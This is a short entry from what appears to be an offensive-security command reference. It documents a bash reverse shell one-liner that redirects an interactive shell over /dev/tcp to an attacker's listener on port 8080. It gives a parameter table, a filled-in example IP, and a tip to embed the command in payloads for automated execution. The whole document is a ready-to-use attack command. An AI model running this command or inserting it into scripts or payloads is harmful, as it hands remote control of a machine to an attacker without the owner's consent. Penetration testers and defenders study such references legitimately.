---
data: 'bash -c ''bash -i >& /dev/tcp/[IP]/8080 0>&1'''
tags:
  - rce
  - reverse-shell
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:17.694Z'
id: 7acfc056-b3d8-4c79-a083-3419081cdd87
verified: false
validated: true
submitted: true
---
# Initiate Reverse Shell

## Command

```bash
bash -c 'bash -i >& /dev/tcp/[IP]/8080 0>&1'
```

## Description

This command initiates an interactive bash shell that connects back to the attacker's IP on port 8080, redirecting stdin/stdout/stderr for full shell access. Used in payloads to achieve RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| [IP] | Attacker's listener IP address | Yes |
| 8080 | Port for connection | Yes |

## Examples

### Basic Usage

```bash
bash -c 'bash -i >& /dev/tcp/192.168.1.100/8080 0>&1'
```

### Advanced Usage

Embed in script or payload for automated execution.

## Expected Output

Interactive shell session allowing command execution on the target, e.g., prompt appears on listener.

## Related

- [[Related Procedure]]
